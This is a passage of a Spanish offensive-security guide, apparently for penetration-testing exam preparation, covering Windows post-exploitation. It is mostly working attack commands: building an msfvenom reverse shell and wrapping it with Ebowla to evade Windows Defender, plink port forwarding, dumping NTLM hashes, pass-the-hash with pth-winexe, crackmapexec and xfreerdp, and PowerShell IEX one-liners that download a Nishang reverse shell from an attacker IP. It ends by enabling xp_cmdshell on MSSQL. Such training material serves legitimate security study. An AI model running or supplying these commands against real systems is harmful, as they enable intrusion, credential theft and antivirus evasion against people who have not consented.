<span class="nb">echo</span><span class="w"> </span>BinStream.SaveToFile<span class="o">(</span><span class="s2">&quot;out.bin&quot;</span><span class="o">)</span><span class="p">;</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>wget.vbs
</code></pre></div>

<p>Una vez hecho, desde la propia máquina comprometida aplicamos el siguiente comando para descargar los recursos que estemos compartiendo en local:</p>
<div class="codehilite"><pre><span></span><code>cscript<span class="w"> </span>/nologo<span class="w"> </span>wget.js<span class="w"> </span>http://192.168.1.45:443/recurso.exe
</code></pre></div>

<p>En caso de haber ganado acceso al equipo Windows con <strong>nishang</strong> aprovechando la utilidad <em>Invoke-PowerShellTcp.ps1</em> (aunque también sirve para consola normal, sólo que me gusta trabajar en este aspecto directamente desde la Powershell), algo que podemos hacer es realizar la transferencia por samba aprovechando <strong>smbserver</strong> de <strong>Impacket</strong>.</p>
<p>Para ello, desde nuestro equipo de atacante, aplicamos el siguiente comando bajo un directorio previo que hayamos creado específico para la compartición de archivos:</p>
<div class="codehilite"><pre><span></span><code>┌─<span class="o">[</span>root@parrot<span class="o">]</span>─<span class="o">[</span>/home/s4vitar/Desktop/smb<span class="o">]</span>
└──╼<span class="w"> </span><span class="c1">#impacket-smbserver shared `pwd`</span>
Impacket<span class="w"> </span>v0.9.18-dev<span class="w"> </span>-<span class="w"> </span>Copyright<span class="w"> </span><span class="m">2002</span>-2018<span class="w"> </span>Core<span class="w"> </span>Security<span class="w"> </span>Technologies

<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Config<span class="w"> </span>file<span class="w"> </span>parsed
<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Callback<span class="w"> </span>added<span class="w"> </span><span class="k">for</span><span class="w"> </span>UUID<span class="w"> </span>4B324FC8-1670-01D3-1278-5A47BF6EE188<span class="w"> </span>V:3.0
<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Callback<span class="w"> </span>added<span class="w"> </span><span class="k">for</span><span class="w"> </span>UUID<span class="w"> </span>6BFFD098-A112-3610-9833-46C3F87E345A<span class="w"> </span>V:1.0
<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Config<span class="w"> </span>file<span class="w"> </span>parsed
<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Config<span class="w"> </span>file<span class="w"> </span>parsed
<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Config<span class="w"> </span>file<span class="w"> </span>parsed
</code></pre></div>

<p>A continuación, desde la máquina Windows desde la sesión Powershell, aplicamos el siguiente comando:</p>
<div class="codehilite"><pre><span></span><code>New-PSDrive<span class="w"> </span>-Name<span class="w"> </span><span class="s2">&quot;SharedFolder&quot;</span><span class="w"> </span>-PSProvider<span class="w"> </span><span class="s2">&quot;FileSystem&quot;</span><span class="w"> </span>-Root<span class="w"> </span><span class="s2">&quot;\\192.168.1.45\shared&quot;</span>
</code></pre></div>

<p>Directamente, veremos como se llevará a cabo una sincronización de recursos, creando una unidad lógica <strong>SharedFolder:\</strong> sobre el equipo Windows que se conecta a nuestra unidad lógica <em><em>pwd</em></em>, la cual sincroniza contra la unidad física donde se sitúa nuestro directorio <strong>shared</strong>, desde donde depositaremos nuestros archivos.</p>
<p>En primer lugar, cambiamos de unidad lógica en la máquina Windows:</p>
<div class="codehilite"><pre><span></span><code><span class="nb">cd</span><span class="w"> </span>SharedFolder:
</code></pre></div>

<p>Posteriormente, nos traemos al equipo los recursos que consideremos:</p>
<div class="codehilite"><pre><span></span><code>move<span class="w"> </span>mimikatz.exe<span class="w"> </span>C:<span class="se">\U</span>sers<span class="se">\s</span>4vitar<span class="se">\D</span>esktop<span class="se">\m</span>imikatz.exe
</code></pre></div>

<p>Podemos no complicar tanto las cosas, haciendo uso para ello del siguiente procedimiento (A modo de ejemplo, ejecutamos en remoto a tiempo real sobre el equipo Windows el binario <em><em>accesschk_v5.02.exe</em></em>:</p>
<div class="codehilite"><pre><span></span><code>$~<span class="w"> </span>smbserver.py<span class="w"> </span>parrotSmbFolder<span class="w"> </span>~/Recurso/<span class="w"> </span><span class="c1"># Especificamos el directorio cuyos recursos queremos compartir</span>
C:<span class="se">\D</span>OCUME~1<span class="se">\ \\</span>IP<span class="se">\p</span>arrotSmbFolder<span class="se">\a</span>ccesschk_v5.02.exe<span class="w"> </span>-accepteula<span class="w"> </span>-uwqs<span class="w"> </span><span class="s2">&quot;usuario&quot;</span><span class="w"> </span>C:<span class="se">\*</span>.*
</code></pre></div>

<p>Esto a su vez nos sirve para copiar archivos del recurso compartido por Samba.</p>
<h4 id="av-evasion-genetic-malware">AV Evasion Genetic Malware<a class="headerlink" href="#av-evasion-genetic-malware" title="Permanent link">&para;</a></h4>
<p>A continuación, se detalla el procedimiento para crear <strong>Malware Genético</strong>, ideal y de utilidad para la evasión de antivirus así como del propio Windows Defender.</p>
<p>Para ello, necesitamos descargar en local el recurso <a href="https://github.com/Genetic-Malware/Ebowla">Ebowla</a>, así como tener instalado <strong>GO</strong> para la forma en la que compilaremos nuestro Malware.</p>
<p>Cuando todo esté preparado, una vez comprometida la máquina Windows, suponiendo para un caso práctico que tenemos que subir un archivo <strong>.exe</strong> para haciendo uso de <strong>RottenPotato</strong> poder escalar privilegios pasando como argumento dicho binario (el cual será ejecutado con privilegios de administrador), donde el Windows Defender nos detiene la ejecución del binario, lo primero será crear nuestro Malware desde <strong>msfvenom</strong>:</p>
<div class="codehilite"><pre><span></span><code>msfvenom<span class="w"> </span>-p<span class="w"> </span>windows/shell_reverse_tcp<span class="w"> </span><span class="nv">LHOST</span><span class="o">=</span><span class="m">192</span>.168.1.45<span class="w"> </span><span class="nv">LPORT</span><span class="o">=</span><span class="m">443</span><span class="w"> </span>-f<span class="w"> </span>exe<span class="w"> </span>-o<span class="w"> </span>shell.exe
</code></pre></div>

<p>Una vez creado, a modo de ejemplo jugando con una simple variable de entorno, aplicamos el siguiente comando en la máquina Windows:</p>
<div class="codehilite"><pre><span></span><code>C:<span class="se">\U</span>sers<span class="se">\s</span>4vitar<span class="se">\D</span>esktop<span class="se">\ </span>hostname
PC-S4vitar
</code></pre></div>

<p>Ya conociendo el <strong>hostname</strong>, llevamos a cabo antes que nada un par de configuraciones a nivel de archivos sobre los recursos que trae <strong>ebowla</strong>. Abrimos en primer lugar el archivo <em>genetic.config</em>, cambiando las variables <strong>output_type</strong> y <strong>payload_type</strong> por las siguientes:</p>
<div class="codehilite"><pre><span></span><code><span class="nv">output_type</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>GO
<span class="nv">payload_type</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>EXE
</code></pre></div>

<p>Una vez hecho, bajamos hasta la sección de variables de entorno:</p>
<div class="codehilite"><pre><span></span><code><span class="w">    </span><span class="o">[[</span>ENV_VAR<span class="o">]]</span>

<span class="w">        </span><span class="nv">username</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;&#39;</span>
<span class="w">        </span><span class="nv">computername</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;&#39;</span>
<span class="w">        </span><span class="nv">homepath</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;&#39;</span>
<span class="w">        </span><span class="nv">homedrive</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;&#39;</span>
<span class="w">        </span><span class="nv">Number_of_processors</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;&#39;</span>
<span class="w">        </span><span class="nv">processor_identifier</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;&#39;</span>
<span class="w">        </span><span class="nv">processor_revision</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;&#39;</span>
<span class="w">        </span><span class="nv">userdomain</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;&#39;</span>
<span class="w">        </span><span class="nv">systemdrive</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;&#39;</span>
<span class="w">        </span><span class="nv">userprofile</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;&#39;</span>
<span class="w">        </span><span class="nv">path</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;&#39;</span>
<span class="w">        </span><span class="nv">temp</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;&#39;</span>


<span class="w">     </span><span class="o">[[</span>PATH<span class="o">]]</span>
</code></pre></div>

<p>En este caso, dado que a modo de ejemplo vamos a jugar únicamente con la variable <strong>hostname</strong>, introducimos su valor en la variable correspondiente:</p>
<div class="codehilite"><pre><span></span><code><span class="w">    </span><span class="o">[[</span>ENV_VAR<span class="o">]]</span>

<span class="w">        </span><span class="nv">username</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;&#39;</span>
<span class="w">        </span><span class="nv">computername</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;PC-S4vitar&#39;</span>
<span class="w">        </span><span class="nv">homepath</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;&#39;</span>
<span class="w">        </span><span class="nv">homedrive</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;&#39;</span>
<span class="w">        </span><span class="nv">Number_of_processors</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;&#39;</span>
<span class="w">        </span><span class="nv">processor_identifier</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;&#39;</span>
<span class="w">        </span><span class="nv">processor_revision</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;&#39;</span>
<span class="w">        </span><span class="nv">userdomain</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;&#39;</span>
<span class="w">        </span><span class="nv">systemdrive</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;&#39;</span>
<span class="w">        </span><span class="nv">userprofile</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;&#39;</span>
<span class="w">        </span><span class="nv">path</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;&#39;</span>
<span class="w">        </span><span class="nv">temp</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;&#39;</span>


<span class="w">     </span><span class="o">[[</span>PATH<span class="o">]]</span>
</code></pre></div>

<p><strong>IMPORTANTE:</strong> Es de vital importancia no confundirse en este punto, pues cabe decir que el cifrado se hace a través de las propias variables de entorno. Esto quiere decir, que tras la ejecución del binario en la máquina comprometida, este se encargará de descifrar todo el ejecutable a través de las propias variables de entorno del sistema, lo que significa que en caso de haberlas introducido mal... la ejecución del binario no será funcional.</p>
<p>Una vez hecho, aplicamos el siguiente comando desde consola:</p>
<div class="codehilite"><pre><span></span><code>┌─<span class="o">[</span>✗<span class="o">]</span>─<span class="o">[</span>root@parrot<span class="o">]</span>─<span class="o">[</span>/home/s4vitar/Desktop/s4vitar/Programas/Bypassing/Ebowla<span class="o">]</span>
└──╼<span class="w"> </span><span class="c1">#python ebowla.py shell.exe genetic.config </span>
<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Using<span class="w"> </span>Symmetric<span class="w"> </span>encryption
<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Payload<span class="w"> </span>length<span class="w"> </span><span class="m">73802</span>
<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Payload_type<span class="w"> </span>exe
<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Using<span class="w"> </span>EXE<span class="w"> </span>payload<span class="w"> </span>template
<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Used<span class="w"> </span>environment<span class="w"> </span>variables:
<span class="w">    </span><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>environment<span class="w"> </span>value<span class="w"> </span>used:<span class="w"> </span>computername,<span class="w"> </span>value<span class="w"> </span>used:<span class="w"> </span>pc-s4vitar
<span class="o">[</span>!<span class="o">]</span><span class="w"> </span>Path<span class="w"> </span>string<span class="w"> </span>not<span class="w"> </span>used<span class="w"> </span>as<span class="w"> </span>pasrt<span class="w"> </span>of<span class="w"> </span>key
<span class="o">[</span>!<span class="o">]</span><span class="w"> </span>External<span class="w"> </span>IP<span class="w"> </span>mask<span class="w"> </span>NOT<span class="w"> </span>used<span class="w"> </span>as<span class="w"> </span>part<span class="w"> </span>of<span class="w"> </span>key
<span class="o">[</span>!<span class="o">]</span><span class="w"> </span>System<span class="w"> </span><span class="nb">time</span><span class="w"> </span>mask<span class="w"> </span>NOT<span class="w"> </span>used<span class="w"> </span>as<span class="w"> </span>part<span class="w"> </span>of<span class="w"> </span>key
<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>String<span class="w"> </span>used<span class="w"> </span>to<span class="w"> </span><span class="nb">source</span><span class="w"> </span>the<span class="w"> </span>encryption<span class="w"> </span>key:<span class="w"> </span>pc-s4vitar
<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Applying<span class="w"> </span><span class="m">10000</span><span class="w"> </span>sha512<span class="w"> </span><span class="nb">hash</span><span class="w"> </span>iterations<span class="w"> </span>before<span class="w"> </span>encryption
<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Encryption<span class="w"> </span>key:<span class="w"> </span>026a42181e07e73b5c926bc8fa30017b05e7e276c18fc29ab3e62e6b8e8436f9
<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Writing<span class="w"> </span>GO<span class="w"> </span>payload<span class="w"> </span>to:<span class="w"> </span>go_symmetric_shell.exe.go
</code></pre></div>

<p>Este paso, lo que hará será crearnos un archivo <strong>go_symmetric_shell.exe.go</strong> en el directorio <strong>output</strong>. Una vez creado, aplicamos el siguiente comando para compilar el binario final:</p>
<div class="codehilite"><pre><span></span><code>┌─<span class="o">[</span>root@parrot<span class="o">]</span>─<span class="o">[</span>/home/s4vitar/Desktop/s4vitar/Programas/Bypassing/Ebowla<span class="o">]</span>
└──╼<span class="w"> </span><span class="c1">#./build_x64_go.sh output/go_symmetric_shell.exe.go finalshell.exe</span>
<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Copy<span class="w"> </span>Files<span class="w"> </span>to<span class="w"> </span>tmp<span class="w"> </span><span class="k">for</span><span class="w"> </span>building
<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Building...
<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Building<span class="w"> </span><span class="nb">complete</span>
<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Copy<span class="w"> </span>finalshell.exe<span class="w"> </span>to<span class="w"> </span>output
<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Cleaning<span class="w"> </span>up
<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Done
</code></pre></div>

<p>Obteniendo un ejecutable final <strong>finalshell.exe</strong>, el cual podemos transferir posteriormente a la máquina Windows.</p>
<p>Es importante que la ruta del binario <strong>go</strong> esté configurada en el <em>PATH</em>, pues en caso contrario no lo encontrará. Si queremos que funcione de manera temporal para la ejecución del <strong>ebowla</strong>, simplemente hacemos un EXPORT de nuestro PATH:</p>
<div class="codehilite"><pre><span></span><code><span class="nb">export</span><span class="w"> </span><span class="nv">PATH</span><span class="o">=</span>/usr/local/go/bin:<span class="nv">$PATH</span>
</code></pre></div>

<p>Obviamente, cuantas más variables de entorno utilicemos mejor será nuestro <em>AV Evasion</em>.</p>
<h4 id="windows-port-forwarding">Windows Port Forwarding<a class="headerlink" href="#windows-port-forwarding" title="Permanent link">&para;</a></h4>
<p>Para ponernos en escena, supongamos que hemos comprometido un equipo Windows como usuario con bajos privilegios. Enumerando las claves de registro, encontramos una contraseña que aparentemente parece ser del usuario <strong>Administrador</strong>. Decidimos no comernos la cabeza con el <strong>RunAs</strong> y queremos usar <strong>psexec</strong> para conseguir acceso como dicho usuario a nivel de sistema entablando la conexión desde nuestro equipo, pero... problema, el equipo no tiene el servicio samba expuesto hacia afuera.</p>
<p>Llegados a este punto, si ya tenemos acceso al sistema... basta con transferir el binario <strong>plink.exe</strong> para llevar a cabo el procedimiento.</p>
<p>Lo único que tenemos que hacer, es iniciar el servicio SSH en nuestro equipo. Es importante que sobre el fichero sshd_config del ssh, el usuario <strong>root</strong> se pueda loguear, pues para que todo esto funcione es necesario que sea root el que se conecte, pues en caso contrario no va a funcionar.</p>
<p>Cuando todo esté configurado correctamente, desde la máquina Windows ya con el binario transferido, aplicamos el siguiente comando hacia nuestra máquina local:</p>
<div class="codehilite"><pre><span></span><code>plink.exe<span class="w"> </span>-l<span class="w"> </span>root<span class="w"> </span>-pw<span class="w"> </span>tuPassword<span class="w"> </span>-R<span class="w"> </span><span class="m">445</span>:127.0.0.1:445<span class="w"> </span>tuDirecciónIP
</code></pre></div>

<p>Automáticamente, se entablará la conexión hacia nuestro equipo y haciendo un <code>lsof -i:445</code>, podremos verificar como se ha levantado el servicio en nuestra máquina.</p>
<p>Ahora la idea es llevar a cabo la autenticación desde nuestra máquina al propio servicio local, el cual enruta al servicio samba de la máquina Windows. Suponiendo que la contraseña del usuario administrador es '<strong>test123</strong>', aplicamos el siguiente comando en local:</p>
<div class="codehilite"><pre><span></span><code>/usr/share/doc/python-impacket/examples/psexec.py<span class="w"> </span>WORKGROUP/Administrator:test123@127.0.0.1<span class="w"> </span>cmd.exe
</code></pre></div>

<p>Una vez aplicado el comando, veremos cómo accedemos al equipo remoto (siempre y cuando las credenciales proporcionadas sean las correctas y se tengan los permisos suficientes sobre los recursos compartidos por el servicio).</p>
<p>Una forma de comprobar que el servicio Samba de nuestro equipo local corresponde al servicio Samba de la máquina remota, es jugando con <strong>cme</strong>, donde podremos ver el HOSTNAME a modo de check.</p>
<p>Simplemente creamos un fichero <em>ip</em> con nuestra IP local (127.0.0.1) y aplicamos posteriormente desde terminal el siguiente comando sobre dicho fichero:</p>
<div class="codehilite"><pre><span></span><code>cme<span class="w"> </span>smb<span class="w"> </span>ip<span class="w"> </span>--gen-relay-list<span class="w"> </span>ip
</code></pre></div>

<h4 id="hashdump-manual">Hashdump Manual<a class="headerlink" href="#hashdump-manual" title="Permanent link">&para;</a></h4>
<p>Desde Metasploit, uno está acostumbrado a utilizar el <strong>hashdump</strong> para dumpear los hashes NTLM del sistema, así como el auxiliar. A continuación se detalla el procedimiento manual para el volcado de hashes NTLM, haciendo uso para ello de la herramienta <strong>pwdump</strong>.</p>
<p>Es tan sencillo como traerse con privilegios de administrador, los recursos <strong>SAM</strong> y <strong>System</strong> del equipo. Una vez transferidos, aplicamos el siguiente comando desde terminal en nuestro equipo:</p>
<div class="codehilite"><pre><span></span><code>pwdump<span class="w"> </span>system<span class="w"> </span>SAM
</code></pre></div>

<p>Directamente, veremos los Hashes NTLM de los usuarios, los cuales posteriormente en caso de figurar el servicio samba abierto podemos aprovechar para hacer <strong>PassTheHash</strong>.</p>
<h4 id="passthehash">PassTheHash<a class="headerlink" href="#passthehash" title="Permanent link">&para;</a></h4>
<p>A la hora de contar con un Hash NTLM válido de usuario, por ejemplo para este caso práctico, de Administrador, podemos llevar a cabo una autenticación contra el sistema a fin de conseguir una Shell interactiva a través del servicio Samba.</p>
<p>Para ello, podemos utilizar herramientas como <strong>pth-winexe</strong>, la cual nos permite hacer conexiones como la siguiente:</p>
<div class="codehilite"><pre><span></span><code>pth-winexe<span class="w"> </span>-U<span class="w"> </span>WORKGROUP/Administrator%aad3c435b514a4eeaad3b935b51304fe:c46b9e588fa0d112de6f59fd6d58eae3<span class="w"> </span>//192.168.1.5<span class="w"> </span>cmd.exe
</code></pre></div>

<p>Como es de obviar, este paso nos ahorra el tener que crackear la contraseña. El hecho de poseer el Hash NTLM de un usuario, nos permite entre otras cosas ser aprovechado para elaborar un <strong>sprying de credenciales</strong> a nivel de red local:</p>
<div class="codehilite"><pre><span></span><code>crackmapexec<span class="w"> </span>smb<span class="w"> </span><span class="m">192</span>.168.1.0/24<span class="w"> </span>-u<span class="w"> </span><span class="s1">&#39;Administrator&#39;</span><span class="w"> </span>-H<span class="w"> </span>aad3c435b514a4eeaad3b935b51304fe:c46b9e588fa0d112de6f59fd6d58eae3<span class="w"> </span>
</code></pre></div>

<p>Obteniendo un <strong>pwned</strong> en caso de lograr la autenticación para algunos de los Hosts probados. A su vez, su uso puede ser útil para inyectar <strong>Mimikatz</strong> desde el propio <strong>crackmapexec</strong>, de la siguiente forma:</p>
<div class="codehilite"><pre><span></span><code>crackmapexec<span class="w"> </span>smb<span class="w"> </span><span class="m">192</span>.168.1.45<span class="w"> </span>-u<span class="w"> </span><span class="s1">&#39;Administrator &#39;</span><span class="w"> </span>-H<span class="w"> </span>aad3c435b514a4eeaad3b935b51304fe:c46b9e588fa0d112de6f59fd6d58eae3<span class="w"> </span>-M<span class="w"> </span>mimikatz
</code></pre></div>

<p>También habría servido contra todo el rango /24. Su uso también puede ser utilizado incluso para en caso de no conocer la contraseña en claro, realizar autenticaciones vía <strong>RDP</strong>:</p>
<div class="codehilite"><pre><span></span><code>xfreerdp<span class="w"> </span>/u:Administrator<span class="w"> </span>/d:WORKGROUP<span class="w"> </span>/pth:c46b9e588fa0d112de6f59fd6d58eae3<span class="w"> </span>/v:192.168.1.5
</code></pre></div>

<h4 id="enumeration-and-privilege-escalation">Enumeration and Privilege Escalation<a class="headerlink" href="#enumeration-and-privilege-escalation" title="Permanent link">&para;</a></h4>
<p>Aunque se le puede dar mil vueltas a este apartado, como tampoco pretendo hacerlo extenso cito 2 recursos fundamentales de numeración que pueden servir bastante de ayuda a la hora de buscar formas de escalar privilegios.</p>
<p>Uno de ellos es el recurso <strong>PowerUp.ps1</strong> de <strong>PowerSploit</strong>, recurso que considero esencial para tener una visual rápida del sistema (en ocasiones podemos encontrar ficheros interesantes e incluso contraseñas en texto claro). Generalmente, lo hay quienes transfieren el archivo sobre el sistema, importan el módulo y luego lo ejecutan... yo lo suelo hacer todo de una.</p>
<p>Para ello, podemos comprobar como una de las funciones principales que contiene el script es la siguiente:</p>
<div class="codehilite"><pre><span></span><code>┌─<span class="o">[</span>root@parrot<span class="o">]</span>─<span class="o">[</span>/opt/PowerSploit/Privesc<span class="o">]</span>
└──╼<span class="w"> </span><span class="c1">#cat PowerUp.ps1 | grep AllChecks  | grep &quot;function&quot; | tr -d &#39;{&#39;</span>
<span class="k">function</span><span class="w"> </span>Invoke-AllChecks<span class="w"> </span>
</code></pre></div>

<p>Para poder ejecutarla de un solo tirón, añadimos una llamada a dicha función al final de nuestro script:</p>
<div class="codehilite"><pre><span></span><code><span class="c1"># Últimas líneas del script</span>

<span class="nv">$Types</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$FunctionDefinitions</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>Add-Win32Type<span class="w"> </span>-Module<span class="w"> </span><span class="nv">$Module</span><span class="w"> </span>-Namespace<span class="w"> </span><span class="s1">&#39;PowerUp.NativeMethods&#39;</span>
<span class="nv">$Advapi32</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$Types</span><span class="o">[</span><span class="s1">&#39;advapi32&#39;</span><span class="o">]</span>
<span class="nv">$Kernel32</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$Types</span><span class="o">[</span><span class="s1">&#39;kernel32&#39;</span><span class="o">]</span>

Invoke-AllChecks
</code></pre></div>

<p>Por tanto, una vez con esto preparado, compartimos un servidor con Python en nuestro equipo sobre el directorio en el que se encuentra el recurso, posteriormente, desde Windows, aplicamos el siguiente comando:</p>
<div class="codehilite"><pre><span></span><code>powershell<span class="w"> </span>IEX<span class="o">(</span>New-Object<span class="w"> </span>Net.WebClient<span class="o">)</span>.downloadString<span class="o">(</span><span class="s1">&#39;http://ipLocal:8080/PowerUp.ps1&#39;</span><span class="o">)</span>
</code></pre></div>

<p>Esperamos unos segundos, y obtendremos directamente los resultados de la ejecución del script.</p>
<p>En cuanto a exploits a usar a nivel de sistema para escalar privilegios, una buena idea es usar el script <strong>Sherlock.ps1</strong> para la enumeración, donde se nos listarán en base al análisis efectuado un puñado de exploits a usar con sus respectivos enlaces. La idea es seguir el mismo concepto que el que hicimos con <strong>PowerUp.ps1</strong>, sólo que en este caso, la función a añadir en la última línea sería <strong>Find-AllVulns</strong>.</p>
<h4 id="powershell-reverse-shell">PowerShell Reverse Shell<a class="headerlink" href="#powershell-reverse-shell" title="Permanent link">&para;</a></h4>
<p>Para los amantes de PowerShell que no viven sin su sesión PS, por aquí os explico una técnica para conseguir acceso al sistema con sesión PowerShell. Lo primero que debemos hacer, es descargar <a href="https://github.com/samratashok/nishang">Nishang</a>, una vez instalado, utilizaremos para este caso el recurso situado en <em>Shells/Invoke-PowerShellTcp.ps1</em>.</p>
<p>Añadimos al final del script la siguiente línea:</p>
<p><code>Invoke-PowerShellTcp -Reverse -IPAddress tuIP -Port 443</code></p>
<p>Una vez hecho, nos montamos un servidor con Python para compartir dicho recurso y por otro lado nos ponemos en escucha por <strong>Netcat</strong> en el puerto 443. Una vez con el arsenal preparado, aplicamos el siguiente comando desde terminal en Windows:</p>
<div class="codehilite"><pre><span></span><code>powershell<span class="w"> </span>IEX<span class="o">(</span>New-Object<span class="w"> </span>Net.WebClient<span class="o">)</span>.downloadString<span class="o">(</span><span class="s1">&#39;http://tuIP:8080/Invoke-PowerShellTcp.ps1&#39;</span><span class="o">)</span>
</code></pre></div>

<p>En cuestión de unos segundos, veremos como se recibe un <strong>GET</strong> del lado de nuestro servidor e inmediatamente ganamos acceso al sistema vía <strong>PowerShell</strong>.</p>
<h4 id="manual-migration-process">Manual Migration Process<a class="headerlink" href="#manual-migration-process" title="Permanent link">&para;</a></h4>
<p>Aunque las máquinas Windows del examen suelen ser de 32 bits, como más vale prevenir que curar detallo una técnica para migrar de un proceso de 32 bits a uno de 64 bits. Cabe decir que este procedimiento es importante de cara a la correcta enumeración del sistema, pues en caso de figurar en un proceso que no corra bajo la arquitectura de la máquina, tanto <strong>Sherlock</strong>, como <strong>PowerUp.ps1</strong> como incluso el propio <strong>suggester</strong> de Metasploit, darán montón de falsos positivos.</p>
<p>El saber con qué aquitectura estamos tratando tanto del sistema operativo como a nivel de proceso, podemos hacerlo via <strong>Powershell</strong>, obteniendo <strong>True</strong> o <strong>False</strong> dependiendo de si es cierto o no a través de las siguientes consultas:</p>
<p><code>[Environment]::Is64BitOperatingSystem</code></p>
<p><code>[Environment]::Is64BitProcess</code></p>
<p>Si vemos que se trata de un sistema operativo de 64 bits, y la sentencia <code>[Environment]::Is64BitProcess</code> nos devuelve un <strong>False</strong>, lo único que tendremos que hacer es por ejemplo ganando sesión por Powershell invocar al mismo desde la siguiente ruta:</p>
<div class="codehilite"><pre><span></span><code>C:<span class="se">\W</span>indows<span class="se">\S</span>ysNative<span class="se">\W</span>indowsPowerShell<span class="se">\v</span><span class="m">1</span>.0<span class="se">\P</span>owershell<span class="w"> </span>IEX<span class="o">(</span>New-Object<span class="w"> </span>Net.WebClient<span class="o">)</span>.downloadString<span class="o">(</span><span class="s1">&#39;http://192.168.1.45:443/Invoke-PowerShellTcp.ps1&#39;</span><span class="o">)</span>
</code></pre></div>

<p>Compartiendo el recurso citado de <strong>nishang</strong>. Si volvemos a checkear en qué proceso nos situamos, podremos ver que esta vez la consulta <code>[Environment]::Is64BitProcess</code> nos devolverá un <strong>True</strong>, pudiendo ya proseguir con la enumeración a nivel de sistema.</p>
<h4 id="rce-filter-evasion-microsoft-sql">RCE Filter Evasion Microsoft SQL<a class="headerlink" href="#rce-filter-evasion-microsoft-sql" title="Permanent link">&para;</a></h4>
<p>El servicio <strong>ms-sql-s</strong> dentro de nuestro <strong>Low Hanging Fruit</strong> es un buen servicio a enumerar, sobre todo para saber si cuenta con credenciales por defecto. En caso de contar con credenciales por defecto, nos podemos conectar vía <strong>sqsh</strong> o a través del script <strong>mssqlclient.py</strong>, pudiendo posteriormente probar si somos capaces de utilizar la funcionalidad <strong>xp_cmdshell</strong>, la cual nos permite ejecutar comandos sobre el sistema.</p>
<p>En caso de contar con credenciales válidas, podemos realizar la autenticación al servicio via <strong>sqsh</strong> de la siguiente forma:</p>
<div class="codehilite"><pre><span></span><code>sqsh<span class="w"> </span>-S<span class="w"> </span><span class="m">192</span>.168.1.X<span class="w"> </span>-U<span class="w"> </span>sa<span class="w"> </span>-P<span class="w"> </span>superPassword
</code></pre></div>

<p>En caso de querer probar credenciales por defecto, como el usuario es <strong>sa</strong> y no posee password, simplemente omitimos el parámetro <strong>-P</strong>.</p>
<p>Una vez conectados, podemos realizar las siguientes instrucciones:</p>
<div class="codehilite"><pre><span></span><code><span class="m">1</span>&gt;<span class="w"> </span>xp_cmdshell<span class="w"> </span><span class="s1">&#39;whoami&#39;</span>
<span class="m">2</span>&gt;go

nt<span class="w"> </span>authority<span class="se">\ </span>system
</code></pre></div>

<p>Puede ser que se de el caso donde tras lanzar la instrucción <strong>go</strong>, se nos presente un mensaje que nos avisa de que el componente está deshabilitado. Para habilitarlo, simplemente seguimos las siguientes instrucciones:</p>
<div class="codehilite"><pre><span></span><code><span class="m">1</span>&gt;<span class="w"> </span>EXEC<span class="w"> </span>SP_CONFIGURE<span class="w"> </span><span class="s1">&#39;show advanced options&#39;</span>,<span class="w"> </span><span class="m">1</span>
<span class="m">2</span>&gt;<span class="w"> </span>reconfigure
<span class="m">3</span>&gt;<span class="w"> </span>go
<span class="m">4</span>&gt;<span class="w"> </span>EXEC<span class="w"> </span>SP_CONFIGURE<span class="w"> </span><span class="s1">&#39;xp_cmdhshell&#39;</span>,<span class="w"> </span><span class="m">1</span>
<span class="m">5</span>&gt;<span class="w"> </span>reconfigure
